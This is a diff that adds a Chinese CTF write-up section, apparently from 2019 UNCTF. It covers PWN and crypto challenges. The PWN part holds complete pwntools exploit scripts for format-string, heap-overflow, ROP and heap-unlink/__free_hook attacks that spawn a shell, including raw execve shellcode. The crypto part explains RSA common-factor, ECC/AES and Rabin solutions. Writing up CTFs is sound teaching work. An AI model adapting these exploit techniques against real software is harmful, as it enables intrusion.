@@ -3924,4 +3924,550 @@ print(base64.b64encode("ZmxhZ3sxNmNlYTM3ZTUzNDA1YThiMWl4YTdkZTlxOWU4ZWRkMX0="))
 ```
 解密结果为: flag{16cea37e53405a8b1b8a7de219e8edd1}
 
+## PWN
+### babyfmt
+#### 原理知识
+1）	Printf的漏洞和shellcode
+#### 解题过程
+1）先确定buf的偏移，并ebp leak，这样就可以推算出ret和buf的地址，然后通过%{}$hn写入ret为buf的下半部分，然后下半部分恰好放置shellcode，这样就可以执行shellcode拿到shell
+
+2)Exp:
+```
+#!/usr/bin/python2.7  
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = "debug"
+context.arch = "i386"
+elf = ELF("babyfmt")
+sh = 0
+lib = 0
+def pwn(ip,port,debug):
+	global sh
+	global lib
+	if(debug == 1):
+		sh = process("./babyfmt")
+	else:
+		sh = remote(ip,port)
+	sh.recvuntil("Please input your message:")
+	payload = "%22$p"
+	sh.send(payload)
+	ebp = int(sh.recv(10),16)
+	ret = ebp - (0xffb66408 - 0xffb663ec)
+	buf_addr = ebp - (0xffb66408 - 0xffb66390)
+	payload = p32(ret) + p32(ret + 2) + "%." + str(buf_addr % 0x10000 + 0x28 - 7) + "d%4$hn"
+	payload += "%." + str((buf_addr >> 16) - (buf_addr % 0x10000) - 0x28 - 2) + "d%5$hn"
+	payload = payload.ljust(0x28,'\x00')
+	payload += "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
+	log.success("ret: " + hex(ret))
+	log.success("ebp: " + hex(ebp))
+	log.success("buf_addr: " + hex(buf_addr))
+	sh.sendline(payload)
+	sh.interactive()
+if __name__ == "__main__":
+	pwn("127.0.0.1",10000,1)
+```
+
+### babyheap
+#### 原理知识
+1）	了解栈溢出，并灵活使用rop技术
+#### 解题过程
+1）chunk中带有puts_got，通过末尾连接，通过show功能就可以知道libc，从而计算出system地址
+
+2）程序中有明显的堆溢出，所以直接覆盖chunk中的puts为system，然后show一个内容为/bin/sh的chunk，即可拿到shell
+Exp如下：
+```
+#!/usr/bin/python2.7  
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = "debug"
+context.arch = "amd64"
+elf = ELF("pwn")
+sh = 0
+lib = 0
+def add(content):
+	sh.sendlineafter("Your choice: ","1")
+	sh.send(content);
+def edit(idx,size,content):
+	sh.sendlineafter("Your choice: ","2")
+	sh.sendlineafter(":",str(idx))
+	sh.sendlineafter(":",str(size))
+	sh.sendafter(":",content)
+def free(idx):
+	sh.sendlineafter("Your choice: ","4")
+	sh.sendlineafter(":",str(idx))
+def show(idx):
+	sh.sendlineafter("Your choice: ","3")
+	sh.sendlineafter(":",str(idx))
+def pwn(ip,port,debug):
+	global sh
+	global lib
+	if(debug == 1):
+		sh = process("./pwn")
+		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+	else:
+		sh = remote(ip,port)
+		lib = ELF("x64_libc.so.6")
+	add('a' * 0x10)
+	edit(0,0x100,'a' * 0x18)
+	show(0)
+	puts = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))
+	libc = puts - lib.symbols['puts']
+	system = libc +lib.symbols['system']
+	payload = '/bin/sh\x00'
+	payload = payload.ljust(0x18,'a')
+	payload += p64(system)
+	edit(0,0x100,payload)
+	show(0)
+	log.success("libc: " + hex(libc))
+	log.success("system: " + hex(system))
+	sh.interactive()
+if __name__ == "__main__":
+	pwn("127.0.0.1",9090,0)
+ ```
+ 
+![](https://ctfwp.wetolink.com/2019unctf/babyheap/1.png)
+
+
+### babyrop
+#### 原理知识
+1）	了解栈溢出，并灵活使用rop技术
+#### 解题过程
+1）首先覆盖变量，然后开启后门，然后通过后门函数来libc leak，然后再次回到后门函数，再次跳转到libc空间执行system(“/bin/sh\x00”)，需要注意的是，对ret地址进行了check，所以先跳到ret上，然后通过check再到libc空间。
+
+Exp如下：
+```
+#!/usr/bin/python2.7  
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = "debug"
+context.arch = "i386"
+elf = ELF("pwn")
+sh = 0
+lib = 0
+def pwn(ip,port,debug):
+	global sh
+	global lib
+	if(debug == 1):
+		sh = process("./pwn")
+		lib = ELF("/lib/i386-linux-gnu/libc.so.6")
+	else:
+		sh = remote(ip,port)
+		lib = ELF("x86_libc.so.6")
+	offset = 0x20
+	payload = offset * 'a' + p32(0x66666666)
+	sh.sendafter("CTFer!",payload)
+	pop_ret = 0x0804865b
+	offset = 0x14
+	payload = offset * "a" + p32(elf.plt['puts']) + p32(pop_ret) + p32(elf.got['__libc_start_main']) + p32(0x0804853D)
+	sh.sendafter("?\n",payload)
+	__libc_start_main = u32(sh.recvuntil("\xf7")[-4:])
+	libc = __libc_start_main - lib.symbols['__libc_start_main']
+	system = libc +lib.symbols['system']
+	binsh = libc +lib.search("/bin/sh\x00").next()
+	offset = 0x14
+        payload = offset * "a" + p32(0x0804839e) + p32(system) + p32(pop_ret) + p32(binsh)
+	sh.sendafter("?\n",payload)
+	log.success("libc: " + hex(libc))
+	log.success("system: " + hex(system))
+	log.success("binsh: " + hex(binsh))
+	sh.interactive()
+if __name__ == "__main__":
+	pwn("127.0.0.1",9090,0)
+```
+运行结果如下：
+
+![](https://ctfwp.wetolink.com/2019unctf/babyrop/1.png)
+
+### Driver
+#### 原理知识
+1）	通过off by one实现unlink，然后通过unlink实现House of spirit，从而实现堆块重叠
+#### 解题过程
+1）运行程序，初步测试功能
+
+![](https://ctfwp.wetolink.com/2019unctf/Driver/1.png)
+
+2）导入IDA分析，发现只能购买三种车，A车可以申请到0x68的堆块，B车可以申请到0xf8的堆块，C车可以申请到0x220的堆块。在edit函数发现off by one，但是只能用一次，利用B车的堆块可以实现unlink，然后通过SpeedUp功能，在特定位置设置FakeFastbin的size位，并且同时可以覆盖name的指针，但是这样无法触发getLiscense功能修改__free_hook，且没有办法知道libc位置，所以将第一辆车的指针改到第二辆车的speed位，然后House of Spirit通过第一辆车的name指针来修改第二辆车的结构体，通过修改第二辆车的指针，可以通过show的功能leak libc，然后通过unsorted bin attack，修改Liscense的数据为一个很大值，同时在第二辆车的name指针覆盖为__free_hook，通过backdoor额外获得一次edit的功能来修改__free_hook为system，同时设置好/bin/sh\x00字符串即可拿到shell。
+
+脚本如下：
+```
+#!/usr/bin/python2.7  
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = "debug"
+context.arch = "amd64"
+elf = ELF("pwn")
+sh = 0
+lib = 0
+def add(idx,content):
+	sh.recvuntil(">>")
+	sh.sendline("1")
+	sh.recvuntil(">>")
+	sh.sendline(str(idx))
+	sh.recvuntil(":")
+	sh.send(content)
+def show():
+	sh.recvuntil(">>")
+	sh.sendline("2")
+def free(idx):
+	sh.recvuntil(">>")
+	sh.sendline("3")
+	sh.recvuntil(":")
+	sh.sendline(str(idx))
+def edit(idx,content):
+	sh.recvuntil(">>")
+	sh.sendline("4")
+	sh.recvuntil(":")
+	sh.sendline(str(idx))
+	sh.recvuntil(":")
+	sh.send(content)
+def gift():
+	sh.recvuntil(">>")
+	sh.sendline("8")
+	sh.recvuntil("gift: ")
+	return int(sh.recvuntil("\n",True),16)
+def up1(idx):
+	sh.recvuntil(">>")
+	sh.sendline("5")
+	sh.recvuntil(":")
+	sh.sendline(str(idx))
+	sh.recvuntil(">>")
+	sh.sendline("1")
+	sh.recvuntil(">>")
+	sh.sendline("1")
+	sh.recvuntil("Car's Speed is ")
+	return int(sh.recvuntil("Km/h",True),10)
+def getlicense(idx,content):
+	sh.recvuntil(">>")
+	sh.sendline("6")
+	sh.recvuntil(":")
+	sh.sendline(str(idx))
+	sh.recvuntil(":")
+	sh.sendline(content)
+def up2(idx):
+	sh.recvuntil(">>")
+	sh.sendline("5")
+	sh.recvuntil(":")
+	sh.sendline(str(idx))
+	sh.recvuntil(">>")
+	sh.sendline("1")
+	sh.recvuntil(">>")
+	sh.sendline("2")
+	sh.recvuntil("Car's Speed is ")
+	return int(sh.recvuntil("Km/h",True),10)
+def down(idx):
+	sh.recvuntil(">>")
+	sh.sendline("5")
+	sh.recvuntil(":")
+	sh.sendline(str(idx))
+	sh.recvuntil(">>")
+	sh.sendline("2")
+def pwn(ip,port,debug):
+	global sh
+	global lib
+	if(debug == 1):
+		sh = process("./pwn")
+		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+	else:
+		sh = remote(ip,port)
+		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+	add(3,'\x11' * 0x220) #idx 0
+	add(2,'\x22' * 0xf8) #idx 1
+	free(1)
+	free(0)
+	add(2,"\n") #idx 0
+	add(2,"\x44" * 0xf8) #idx 1
+	heap_base = gift()
+	heap_base = (heap_base >> 12) << 12
+	payload = ''
+	payload += p64(0) + p64(0xf1) 
+	payload += p64(heap_base + 0x58 - 0x18) + p64(heap_base + 0x58 - 0x10)
+	payload += p64(0) * 3 + p64(0x1234)
+	payload = payload.ljust(0xf0,'\x55')
+	payload += p64(0xf0)
+	edit(0,payload)
+	free(1)
+	for i in range(48):
+		down(0)
+	for i in range(3):
+		up1(0)
+	for i in range(3):
+		up2(0)
+	up1(0)
+	payload = ''
+	payload += p64(0) * 7 + p64(0x1234)
+	payload = payload.ljust(0x220,'\x66')
+	add(3,payload)
+	free(0)
+	payload = p64(0) + p64(0x68) + p64(0) + p64(heap_base + 0x2b0) + p64(0)
+	payload += p64(0x101) + p64(0) + p32(0x221) + "\n"
+	add(1,payload)
+	for i in range(48):
+		down(1)
+	for i in range(3):
+		up1(1)
+	for i in range(3):
+		up2(1)
+	up1(1)
+	free(0)
+	payload = ''
+	payload += p64(0) + p64(0x220) + p64(0) + p64(heap_base + 0x270)
+	payload += p32(0x220)
+	add(1,payload)
+	show()
+	main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 88
+	libc = main_arena - 0x10 - lib.symbols['__malloc_hook']
+	__free_hook = libc + lib.symbols['__free_hook']
+	system = libc + lib.symbols['system']
+	free(0)
+	payload = ''
+	payload += p64(0) * 2 + p64(0x220) + p64(heap_base + 0x2e0) + p32(0x220) + "\n"
+	add(1,payload)
+	add(3,'aaa\n')
+	free(1)
+	free(0)
+	payload = ''
+	payload += p64(0) * 2 + p64(0x220) + p64(heap_base + 0x2e0) + p64(0x220) + p64(0x231) + p64(main_arena + 88) + p64(heap_base)
+	payload += '\n'
+	add(1,payload)
+	add(3,p64(0))
+	free(0)
+	payload = ''
+	payload += '/bin/sh\x00'*2 + p64(0x220) + p64(__free_hook) + p32(0)
+	payload += '\n'
+	add(1,payload)
+	getlicense(1,p64(system))
+	free(0)
+	log.success("main_arena: " + hex(main_arena))
+	log.success("heap_base: " + hex(heap_base))
+	log.success("__free_hook: " + hex(__free_hook))
+	log.success("libc: " + hex(libc))
+	log.success("system: " + hex(system))
+	#gdb.attach(sh)
+	sh.interactive()
+if __name__ == "__main__":
+	pwn("127.0.0.1",9999,1)
+```
+
+![](https://ctfwp.wetolink.com/2019unctf/Driver/2.png)
+
+本地测试拿到shell
+
+### easy_pwn
+#### 原理知识
+1）	通过sprintf 造成溢出
+#### 解题过程
+1）运行程序，初步测试功能
+
+1）	导入IDA分析，发现有个 sprintf函数这个函数会
+在输入一定长度的name 后造成溢出 覆盖到 stack上面的 size 位 从而知道一个溢出这也我们就能rop 溢出泄露拿权限
+
+脚本如下：
+```
+from pwn import *
+context.log_level = 'debug'
+
+exe = './pwn'
+libc = 'libc.so.6'
+
+#p = process(exe)
+p = remote('127.0.0.1',10000)
+elf = ELF(exe)
+lib = ELF('x86_libc.so.6')
+
+def d(s=''):
+	gdb.attach(p, s)
+
+main = 0x804858B
+
+p.recvuntil('id:')
+p.sendline('10')
+p.recvuntil('your name:')
+p.sendline('BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBaaaa')
+
+payload = 'A'*0x18+'bbbb'+p32(elf.plt['puts'])+p32(main)+p32(elf.got['puts'])
+p.recvuntil('me?\n')
+p.sendline(payload)
+
+p.recvuntil('mean!\n')
+puts_addr = u32(p.recv(4))
+libc_base = puts_addr - lib.sym['puts']
+success('libc_base--->'+hex(libc_base))
+
+p.recvuntil('id:')
+p.sendline('10')
+p.recvuntil('your name:')
+p.sendline('BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBaaaa')
+
+system = libc_base + lib.sym['system']
+binsh = libc_base + lib.search("/bin/sh\x00").next()
+payload = 'A'*0x18+'bbbb'+p32(system)+p32(main)+p32(binsh)
+p.recvuntil('me?\n')
+p.sendline(payload)
+
+
+p.interactive()
+```
+
+
+### Hermes
+#### 原理知识
+Gets函数是不安全的函数，会导致栈溢出，通过覆盖返回地址可以跳转到sys函数中。
+#### 解题过程
+1）打开浏览器，下载程序
+
+2）用IDAx64打开程序
+
+3）查看到name函数中有溢出点，sys函数中有shell
+
+![](https://ctfwp.wetolink.com/2019unctf/Hermes/1.png)![](https://ctfwp.wetolink.com/2019unctf/Hermes/2.png)
+
+4）编写脚本，完成栈溢出的利用
+
+### Sosoeasypwn
+#### 原理知识
+函数指针的认识，和对pie 保护的认识。然后我们能绕过 pie
+#### 解题过程
+1）打开浏览器，下载程序
+
+2）用IDA打开程序
+
+3）发现第二个函数
+
+![](https://ctfwp.wetolink.com/2019unctf/Sosoeasypwn/1.png)
+
+没有溢出但是 答应了一个函数的前几位地址
+
+然后是没有溢出的输入
+
+![](https://ctfwp.wetolink.com/2019unctf/Sosoeasypwn/2.png)
+
+第三个函数 接受我们的输入 然后复制函数指针。
+
+但是如果我们 输入的是 1,2 以外的 数 v1 就不会得到函数指针而是用 stack 上的值
+
+我们就可以 通过第二个函数布置
+
+但是 开启pie 我们只能得到 addr 的前2字节 我们发现有后面函数就能爆破半字节从而
+
+调用后门函数得到shell
+
+4）编写脚本，完成函数指针的利用和pie的绕过。
+
+## Crypto
+### BabyRsa
+#### 原理知识
+1）	对两素数乘积N进行因式分解。
+
+2）	根据欧拉 公式计算出私钥d，进行解密。
+
+### ECC和AES基础
+#### 原理知识
+1）	公钥密码，解决了密钥分配问题，安全性大大提高。同时，公钥密码的加、解密需要付出的成本更高，速度更慢。适用于短信息加密
+
+2）	对称密码，密钥分配问题难以解决。但其拥有良好的加密性能与加密效率，适用于大文件加密。
+
+3）	现在，市场上的加密机制多采用公钥密码与私钥密码组合加密的模式。即，使用公钥密码加密密钥，使用对称密码加密信息
+
+4）	ECC基于椭圆曲线，离散对数难解问题。对其攻击方法，现有BSGS（小步大步法）、Pohlig-Hellman法（相当有效）等
+#### 解题过程
+1.  下载压缩包，记事本打开阅读加密算法，如下图
+
+![](https://ctfwp.wetolink.com/2019unctf/ecc_aes/38f4074ee48cf23c15025fbecc9603c6.png)
+
+2）题目，首先用ECC加密aes的密钥，然后用aes加密明文
+
+1.  首先，通过解开ecc的私钥k（注意区分大小k、K），继而求得aes密钥。如图，这里使用的是sage，用python也可。
+
+![](https://ctfwp.wetolink.com/2019unctf/ecc_aes/8c7d6c8b52d51ad29a2ebe5a8f7c83b9.png)
+
+1.  得到aes_key后，解密密文，即可得到flag，如下图
+
+![](https://ctfwp.wetolink.com/2019unctf/ecc_aes/250b257e1c516ed711c338a2fc1b1264.png)
+
+### 不仅仅是RSA
+#### 原理知识
+1）	由于两组加密p相同可以很容易求出q，得到突破口
+
+2）摩斯音频转换需要找到合适方法
+#### 解题过程
+1.  下载附件，得到5个文件
+
+![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/1df58de813d2b97e2dbb98c05b4a7a11.png)
+
+2）首先分析RSA.py
+
+![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/10eb9015db9e14a639378ac333862540.png)
+
+分析得到：
+
+n1=p1*q
+
+n2=p2*q
+
+∴模不互素 （gcd(n1,n2)!=1）
+
+∴gcd(n1,n2)=q
+
+3）根据pem文件得到两个公钥
+
+![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/f0088e307ec5a07f308365a841a0848d.png)
+
+1.  根据wav文件得到密文c
+
+![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/3c03f826455633a1e878cd4339ca52b7.png)
+
+![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/2da2789fb0c9dac16104cbe5efc8dd23.png)
+
+1.  编写解密脚本，运行即可获得flag
+
+![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/14125a4f7d3859f379f30bd0fc8d25eb.png)
+
+![](https://ctfwp.wetolink.com/2019unctf/not_only_rsa/4c82f3e8358ce84f5bfd0d02216ec9b8.png)
+
+### 一句话加密
+#### 原理知识
+1）	e=2是Rabin算法，而不是RSA由于两组加密p相同可以很容易求出q，得到突破口
+
+2）	遇到不熟悉密码是快速搜索能力
+#### 解题过程
+1.  下载附件，得到2个文件
+
+![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/62c27498e18b668526fba466027967dc.png)
+
+2）首先分析encode.py,果然如题目，是一句话加密
+
+![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/3d5842c0542081adbd6ab398fc455ff7.png)
+
+分析大概应该是rsa之类的，得找到公钥（n,e）
+
+1.  分析e.jpg
+
+    ![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/ac4bb5e413f43f78011bf7ae8b222ba0.png)
+
+不知道什么密码
+
+1.  用HxD打开，看到最后有一段16进制数，猜测是n,还提示了个kobe
+
+![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/9961fb2bce9e2edafa5c7a4ddb745b8a.png)
+
+5）百度搜索kobe 发现kobe code 这个密码会出现的科比的球鞋上
+
+![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/527cfe2870e0402f04d0425b3d479d1f.png)
+
+解密e 得到e=2
+
+6)e=2,那说明是RSA的衍生算法Rabin了，根据已经得到的数据，推理出完整的加密算法
+
+![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/856e40c2c1107a3fd131fa1dee1fbd17.png)
+
+7）分解n,并写解密exp
+
+![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/1b606212f95987c3ff3241be639ac0cb.png)
+
+8）修改c,两次运行脚本拼接得到flag
+
+![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/2bb67e42b284877184fad59bb9531c59.png)
+
+![](https://ctfwp.wetolink.com/2019unctf/encrypt_shell/b5d52673182db918676e420690f178e2.png)
+
 # 评论区
